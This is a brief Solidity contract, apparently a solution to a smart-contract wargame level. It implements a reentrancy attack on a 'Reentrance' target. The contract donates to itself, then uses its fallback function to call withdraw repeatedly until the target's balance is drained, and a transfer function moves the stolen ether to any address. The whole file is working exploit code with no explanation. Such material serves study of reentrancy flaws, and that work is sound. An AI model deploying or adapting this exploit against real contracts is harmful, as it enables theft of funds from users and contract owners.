pragma solidity ^0.4.18;

import './Reentrance.sol';

contract ReentranceAttack {

  Reentrance target;

  function ReentranceAttack(address _target) public {
    target = Reentrance(_target);
  }

  function donateToSelf() public payable {
    target.donate.value(this.balance)(address(this));
  }

  function() public payable {
    if (address(target).balance != 0) {
      target.withdraw(1 ether);
    }
  }

  function transfer(address _addr) public {
    address(_addr).transfer(this.balance);
  }
}
